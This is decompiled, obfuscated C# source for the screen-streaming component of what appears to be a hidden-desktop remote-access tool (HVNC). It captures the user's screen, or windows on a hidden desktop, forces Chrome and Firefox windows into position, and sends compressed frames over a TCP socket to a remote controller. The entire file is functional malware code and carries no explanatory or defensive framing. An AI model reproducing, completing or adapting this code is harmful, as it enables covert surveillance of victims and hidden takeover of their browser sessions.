using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using RemoteClient.Mappers;
using RemoteClient.Polices;
using sdfsdf.Containers;

namespace RemoteClient
{
	// Token: 0x02000025 RID: 37
	public class Streaming : IDisposable
	{
		// Token: 0x060000AB RID: 171 RVA: 0x00004BFC File Offset: 0x00002DFC
		public Streaming(Socket s)
		{
			InvocationProcessPolicy.CompareError();
			this._Task = new List<IntPtr>();
			this._Info = new List<IntPtr>();
			this.StopStream = true;
			this.@ref = Encoding.ASCII.GetBytes("<EOF>");
			base..ctor();
			this.tcpStream = s;
		}

		// Token: 0x060000AC RID: 172 RVA: 0x00004C50 File Offset: 0x00002E50
		public void StreamDefault()
		{
			Thread.CurrentThread.Priority = ThreadPriority.Highest;
			Bitmap bitmap;
			try
			{
				if (Streaming.size.Width == 0 || Streaming.size.Height == 0)
				{
					throw new Exception();
				}
				bitmap = new Bitmap(Streaming.size.Width, Streaming.size.Height, PixelFormat.Format24bppRgb);
			}
			catch
			{
				Streaming.size = Screen.PrimaryScreen.Bounds.Size;
				if (Streaming.size.Width == 0 || Streaming.size.Height == 0)
				{
					SchemaMapper.ReflectContext("no monitor detected, may be VPS/RDP");
					this.StopStream = true;
					return;
				}
				bitmap = new Bitmap(Streaming.size.Width, Streaming.size.Height, PixelFormat.Format24bppRgb);
			}
			ParamRuleContainer.SetThreadDesktop(Streaming.defaultDesktp);
			while (!this.StopStream)
			{
				try
				{
					Graphics graphics = Graphics.FromImage(bitmap);
					graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
					BitmapData bitmapData = bitmap.LockBits(new Rectangle(0, 0, Streaming.size.Width, Streaming.size.Height), ImageLockMode.ReadWrite, bitmap.PixelFormat);
					using (MemoryStream memoryStream = new MemoryStream())
					{
						try
						{
							this.StreamCodec.CodeImg(bitmapData, memoryStream);
						}
						catch (Exception ex)
						{
							SchemaMapper.ReflectContext(ex.ToString());
						}
						if (memoryStream.ToArray().Length > 4)
						{
							try
							{
								List<byte> list = memoryStream.ToArray().ToList<byte>();
								list = this.AwakeMapper(list.ToArray()).ToList<byte>();
								list.AddRange(this.@ref);
								this.tcpStream.Receive(new byte[1]);
								this.tcpStream.BeginSend(list.ToArray(), 0, list.Count, SocketFlags.None, new AsyncCallback(this.UpdateMapper), this.tcpStream);
							}
							catch
							{
							}
						}
						bitmap.UnlockBits(bitmapData);
					}
					graphics.Dispose();
					GC.Collect();
				}
				catch (Exception ex2)
				{
					SchemaMapper.ReflectContext(ex2.ToString());
				}
			}
			this.StreamCodec.Dispose();
			this.StreamCodec = null;
			this.IncludeMapper();
		}

		// Token: 0x060000AD RID: 173 RVA: 0x00004EEC File Offset: 0x000030EC
		[SuppressUnmanagedCodeSecurity]
		public void StreamAd()
		{
			Streaming.DispatcherGetterLicense dispatcherGetterLicense = new Streaming.DispatcherGetterLicense();
			dispatcherGetterLicense.status = this;
			Bitmap bitmap;
			try
			{
				if (Streaming.size.Width == 0 || Streaming.size.Height == 0)
				{
					throw new Exception();
				}
				bitmap = new Bitmap(Streaming.size.Width, Streaming.size.Height, PixelFormat.Format24bppRgb);
			}
			catch
			{
				Streaming.size = Screen.PrimaryScreen.Bounds.Size;
				if (Streaming.size.Width == 0 || Streaming.size.Height == 0)
				{
					SchemaMapper.ReflectContext("no monitor detected, may be VPS/RDP");
					this.StopStream = true;
					return;
				}
				bitmap = new Bitmap(Streaming.size.Width, Streaming.size.Height, PixelFormat.Format24bppRgb);
			}
			ParamRuleContainer.SetThreadDesktop(Streaming.Hdsktp);
			Thread.CurrentThread.Priority = ThreadPriority.Highest;
			dispatcherGetterLicense.@class = new List<IntPtr>();
			while (!this.StopStream)
			{
				try
				{
					Streaming.WrapperMapperImporter wrapperMapperImporter = new Streaming.WrapperMapperImporter();
					wrapperMapperImporter.m_Server = dispatcherGetterLicense;
					wrapperMapperImporter.m_System = 0;
					ParamRuleContainer.EnumWindows(new ParamRuleContainer.Record(wrapperMapperImporter.ValidateMapper), IntPtr.Zero);
					for (int i = wrapperMapperImporter.m_System - 1; i >= 0; i--)
					{
						ParamRuleContainer.RegParserResolver regParserResolver = default(ParamRuleContainer.RegParserResolver);
						ParamRuleContainer.GetWindowRect(wrapperMapperImporter.m_Server.@class[i], out regParserResolver);
						if (regParserResolver.QueryMapper() != 0 && regParserResolver.StartMapper() != 0)
						{
							if (i != 0)
							{
								IntPtr asset = wrapperMapperImporter.m_Server.@class[i - 1];
								ParamRuleContainer.RegParserResolver regParserResolver2 = default(ParamRuleContainer.RegParserResolver);
								ParamRuleContainer.GetWindowRect(asset, out regParserResolver2);
								if (regParserResolver2.RateMapper() < regParserResolver.RateMapper() && regParserResolver2.DeleteMapper() < regParserResolver.DeleteMapper() && regParserResolver2.SetMapper() > regParserResolver.SetMapper() && regParserResolver2.SortMapper() > regParserResolver.SortMapper())
								{
									goto IL_26E;
								}
							}
							using (Bitmap bitmap2 = new Bitmap(regParserResolver.QueryMapper(), regParserResolver.StartMapper(), PixelFormat.Format24bppRgb))
							{
								using (Graphics graphics = Graphics.FromImage(bitmap2))
								{
									IntPtr hdc = graphics.GetHdc();
									ParamRuleContainer.PrintWindow(wrapperMapperImporter.m_Server.@class[i], hdc, 0);
									graphics.ReleaseHdc(hdc);
									ParamRuleContainer.DeleteDC(hdc);
									Graphics graphics2 = Graphics.FromImage(bitmap);
									graphics2.DrawImage(bitmap2, regParserResolver.RateMapper(), regParserResolver.DeleteMapper());
									graphics2.Dispose();
								}
							}
						}
						IL_26E:;
					}
					BitmapData bitmapData = null;
					using (MemoryStream memoryStream = new MemoryStream())
					{
						try
						{
							bitmapData = bitmap.LockBits(new Rectangle(0, 0, Streaming.size.Width, Streaming.size.Height), ImageLockMode.ReadWrite, bitmap.PixelFormat);
							if (bitmapData.Scan0 == IntPtr.Zero)
							{
								SchemaMapper.ReflectContext("no monitor detected, may be VPS/RDP");
								continue;
							}
							this.StreamCodec.CodeImg(bitmapData, memoryStream);
						}
						catch (Exception ex)
						{
							SchemaMapper.ReflectContext(ex.ToString());
						}
						if (memoryStream.ToArray().Length > 4)
						{
							List<byte> list = memoryStream.ToArray().ToList<byte>();
							list = this.AwakeMapper(list.ToArray()).ToList<byte>();
							list.AddRange(this.@ref);
							this.tcpStream.Receive(new byte[1]);
							this.tcpStream.BeginSend(list.ToArray(), 0, list.Count, SocketFlags.None, new AsyncCallback(this.UpdateMapper), this.tcpStream);
						}
						bitmap.UnlockBits(bitmapData);
					}
					GC.Collect();
					wrapperMapperImporter.m_Server.@class.Clear();
				}
				catch (Exception ex2)
				{
					SchemaMapper.ReflectContext(ex2.ToString());
				}
			}
			this.StreamCodec.Dispose();
			this.StreamCodec = null;
			this.IncludeMapper();
		}

		// Token: 0x060000AE RID: 174 RVA: 0x00005368 File Offset: 0x00003568
		private void UpdateMapper(IAsyncResult key)
		{
			object writer = Streaming.m_Writer;
			object obj = writer;
			lock (obj)
			{
				try
				{
					((Socket)key.AsyncState).EndSend(key);
				}
				catch (Exception ex)
				{
					Console.WriteLine(ex.ToString());
				}
			}
		}

		// Token: 0x060000AF RID: 175 RVA: 0x000053D4 File Offset: 0x000035D4
		private byte[] AwakeMapper(byte[] config)
		{
			byte[] result;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Compress))
				{
					gzipStream.Write(config, 0, config.Length);
					gzipStream.Close();
					result = memoryStream.ToArray();
				}
			}
			return result;
		}

		// Token: 0x060000B0 RID: 176 RVA: 0x00005440 File Offset: 0x00003640
		public void WaitReq(object _mon)
		{
			byte b = (byte)_mon;
			this.ConcatMapper();
			try
			{
				if (b == 0)
				{
					Streaming.ActiveDesktop = Streaming.defaultDesktp;
					new Thread(new ThreadStart(this.StreamDefault)).Start();
				}
				else
				{
					SchemaMapper.ComputeContext();
					new Thread(new ThreadStart(this.StreamAd)).Start();
				}
			}
			catch (Exception ex)
			{
				SchemaMapper.ReflectContext(ex.ToString());
			}
		}

		// Token: 0x060000B1 RID: 177 RVA: 0x000025DD File Offset: 0x000007DD
		private void ConcatMapper()
		{
			Streaming.size = SchemaMapper.InvokeContext();
			this.StreamCodec = new FastCodec(Streaming.size);
		}

		// Token: 0x060000B2 RID: 178 RVA: 0x000054C0 File Offset: 0x000036C0
		private void IncludeMapper()
		{
			try
			{
				this.tcpStream.BeginSend(new byte[4], 0, 4, SocketFlags.None, new AsyncCallback(this.UpdateMapper), this.tcpStream);
			}
			catch
			{
			}
		}

		// Token: 0x060000B3 RID: 179 RVA: 0x0000550C File Offset: 0x0000370C
		public void Dispose()
		{
			this._Task.Clear();
			this._Task.TrimExcess();
			this._Info.Clear();
			this._Info.TrimExcess();
			this.tcpStream.Shutdown(SocketShutdown.Both);
			this.tcpStream.Close();
			this.tcpStream.Dispose();
			if (this.StreamCodec != null)
			{
				this.StreamCodec.Dispose();
				this.StreamCodec = null;
			}
			GC.Collect();
		}

		// Token: 0x060000B4 RID: 180 RVA: 0x0000558C File Offset: 0x0000378C
		// Note: this type is marked as 'beforefieldinit'.
		static Streaming()
		{
			InvocationProcessPolicy.CompareError();
			Streaming.size = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
			Streaming.defaultDesktp = ParamRuleContainer.GetThreadDesktop(ParamRuleContainer.GetCurrentThreadId());
			Streaming.m_Writer = new object();
		}

		// Token: 0x0400007D RID: 125
		private bool iterator;

		// Token: 0x0400007E RID: 126
		private bool _Observer;

		// Token: 0x0400007F RID: 127
		private List<IntPtr> _Task;

		// Token: 0x04000080 RID: 128
		private List<IntPtr> _Info;

		// Token: 0x04000081 RID: 129
		public static Size size;

		// Token: 0x04000082 RID: 130
		public static IntPtr ActiveDesktop;

		// Token: 0x04000083 RID: 131
		public static IntPtr defaultDesktp;

		// Token: 0x04000084 RID: 132
		public static IntPtr Hdsktp;

		// Token: 0x04000085 RID: 133
		public bool StopStream;

		// Token: 0x04000086 RID: 134
		public Socket tcpStream;

		// Token: 0x04000087 RID: 135
		public FastCodec StreamCodec;

		// Token: 0x04000088 RID: 136
		private byte[] @ref;

		// Token: 0x04000089 RID: 137
		private static object m_Writer;

		// Token: 0x02000026 RID: 38
		[CompilerGenerated]
		private sealed class DispatcherGetterLicense
		{
			// Token: 0x060000B5 RID: 181 RVA: 0x00002297 File Offset: 0x00000497
			public DispatcherGetterLicense()
			{
				InvocationProcessPolicy.CompareError();
				base..ctor();
			}

			// Token: 0x0400008A RID: 138
			public Streaming status;

			// Token: 0x0400008B RID: 139
			public List<IntPtr> @class;
		}

		// Token: 0x02000027 RID: 39
		[CompilerGenerated]
		private sealed class WrapperMapperImporter
		{
			// Token: 0x060000B6 RID: 182 RVA: 0x00002297 File Offset: 0x00000497
			public WrapperMapperImporter()
			{
				InvocationProcessPolicy.CompareError();
				base..ctor();
			}

			// Token: 0x060000B7 RID: 183 RVA: 0x000055E8 File Offset: 0x000037E8
			internal bool ValidateMapper(IntPtr task, IntPtr cust)
			{
				if (ParamRuleContainer.IsWindowVisible(task))
				{
					ParamRuleContainer.RegParserResolver regParserResolver = default(ParamRuleContainer.RegParserResolver);
					ParamRuleContainer.GetWindowRect(task, out regParserResolver);
					if (regParserResolver.QueryMapper() == 0 || regParserResolver.StartMapper() == 0)
					{
						return true;
					}
					if (!this.m_Server.status._Task.Contains(task))
					{
						StringBuilder stringBuilder = new StringBuilder(100);
						ParamRuleContainer.GetClassName(task, stringBuilder, 100);
						if (stringBuilder.ToString() == "Chrome_WidgetWin_1" && !this.m_Server.status.iterator)
						{
							this.m_Server.status.iterator = true;
							ParamRuleContainer.SetWindowPos(task, ParamRuleContainer.ResolverProductPage.facade, 0, 0, Streaming.size.Width, Streaming.size.Height - 20, 1u);
						}
						else if (stringBuilder.ToString() == "MozillaWindowClass" && !this.m_Server.status._Observer)
						{
							this.m_Server.status._Observer = true;
							ParamRuleContainer.SetWindowPos(task, ParamRuleContainer.ResolverProductPage.facade, 0, 0, Streaming.size.Width, Streaming.size.Height - 20, 1u);
						}
						uint num = (uint)((int)ParamRuleContainer.GetWindowLong(task, -20));
						num |= 33554432u;
						ParamRuleContainer.SetWindowLong(task, -20, (IntPtr)((long)((ulong)num)));
						this.m_Server.status._Task.Add(task);
					}
					this.m_Server.@class.Add(task);
					int system = this.m_System;
					this.m_System = system + 1;
				}
				return true;
			}

			// Token: 0x0400008C RID: 140
			public int m_System;

			// Token: 0x0400008D RID: 141
			public Streaming.DispatcherGetterLicense m_Server;
		}
	}
}
